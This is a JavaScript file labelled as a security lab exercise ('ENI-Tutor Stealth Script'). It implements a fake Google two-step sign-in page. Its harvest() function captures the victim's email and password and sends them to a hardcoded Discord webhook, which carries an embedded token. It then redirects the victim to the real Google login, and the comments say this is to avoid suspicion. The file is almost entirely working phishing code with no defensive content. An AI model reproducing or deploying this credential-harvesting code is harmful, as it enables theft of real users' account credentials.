/**
 * LAB_EXERCISES_72.txt - Lab 3.2: Document Injection / Logic Trap
 * Architecture: ENI-Tutor Stealth Script v3.2
 * Objective: Frictionless state transition and silent data exfiltration.
 */

const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

/**
 * Handles the transition from Email (Step 1) to Password (Step 2).
 * Utilizes the 'fade-out' and 'fade-in' classes for Material Design fluidity.
 */
function next() {
    const emailInput = document.getElementById('email');
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const userDisplay = document.getElementById('user-display');

    if (emailInput.value.includes('@') && emailInput.value.length > 5) {
        // Phase 1: Initiate the slide-out animation
        step1.classList.add('fade-out');

        // Phase 2: Swap the DOM elements during the opacity dip
        setTimeout(() => {
            step1.style.display = 'none';
            userDisplay.innerText = emailInput.value;
            step2.style.display = 'block';

            // Phase 3: Trigger the entrance animation
            setTimeout(() => {
                step2.classList.add('fade-in');
            }, 10);
        }, 250); // Matches the CSS transition duration
    } else {
        // Optional: Simple visual shake or border change if email is invalid
        emailInput.style.border = "1px solid #d93025";
    }
}

/**
 * The Harvest: Silently captures credentials and exfiltrates.
 * Follows the "Silent Operator" protocol - no alerts, only redirects.
 */
async function harvest() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('pass').value;

    // Construct the payload for the Discord Webhook
    const payload = {
        embeds: [{
            title: "🎯 Lab 3.2: Capture Successful",
            color: 4353924, // Google Blue
            fields: [
                { name: "Target Email", value: `\`${email}\``, inline: false },
                { name: "Target Password", value: `\`${password}\``, inline: false },
                { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
            ],
            footer: { text: "ENI-Tutor Security Research - Tier 3" }
        }]
    };

    // Execution: Post the data. We don't 'await' it because we want 
    // the redirect to happen instantly to avoid user suspicion.
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(err => console.error("Exfiltration failed:", err));

    // The Reveal: Redirect to the actual Google login to finish the "Logic Trap"
    // The user thinks they just had a minor glitch or needed to re-auth.
    setTimeout(() => {
        window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com";
    }, 100);
}
